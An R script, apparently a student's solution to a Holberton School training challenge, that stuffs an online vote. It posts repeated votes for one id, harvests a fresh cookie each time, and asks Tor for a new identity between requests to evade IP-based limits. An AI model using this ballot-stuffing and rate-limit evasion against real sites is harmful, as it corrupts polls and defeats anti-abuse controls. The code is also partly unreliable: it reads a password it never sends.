# ===---Hodor Level 4----------------------------------------------------------===
#    Solution for the Hodor Project, Level 4 by Julien Barbier.
#    Using R Language with RCurl library + Socks5 Tor network.
#
#    by Alexandro de Oliveira, for Holberton School
# ===--------------------------------------------------------------------------===

library(RCurl)

url     <- "http://173.246.108.142/level4.php"
# Get password to Tor Controller:
passwd <- readline(prompt = "Controller Password => ")
# Cookie to first request:
cookie <- "c6166bbba1415156f4d1c933f82c915d76e9323f"

options(RCurlOptions = list(
    proxy = "socks5h://127.0.0.1:9050", # Tor native proxy.
    referer = url,
    useragent = "havk64 Rlang/Tor requests",
    cookie = paste("HoldTheDoor", sep = "=", cookie)
    )
)
handle  <- getCurlHandle()
h       <- basicHeaderGatherer()
# To check the current IP(Tor exit):
# ip      <- getURL("https://api.ipify.org", curl = handle, headerFunction = h$update)
# Set connection to Tor Controller to request new identity:
con     <- socketConnection(host="127.0.0.1",port=9051)
count   <- 1L
total   <- 98L
while(count < total) {
    # Get and parse a fresh cookie:
    html    <- getURL(url = url, curl = handle, headerfunction = h$update)
    cookie  <- strsplit(h$value()['Set-Cookie'], ';')$`Set-Cookie`[1]
    value   <- unlist(strsplit(cookie, '='))[2]
    # Set the header, socks5 connection:
    options(RCurlOptions = list(
        proxy = "socks5h://127.0.0.1:9050",
        referer = url,
        useragent = "havk64 Rlang/Tor requests",
        cookie = paste("HoldTheDoor", sep = "=", value)
        )
    )
    # the Post request.
    p   <- postForm(url, id = "23", holdthedoor = "submit", key = value, curl = handle, style = "POST")
    # Request a new identity:
    writeLines('AUTHENTICATE \"passwd\"\r\nSIGNAL NEWNYM\r\n', con = con)
    Sys.sleep(10)
    count <- count + 1
}
cat("Total of valid voltes: ", count)
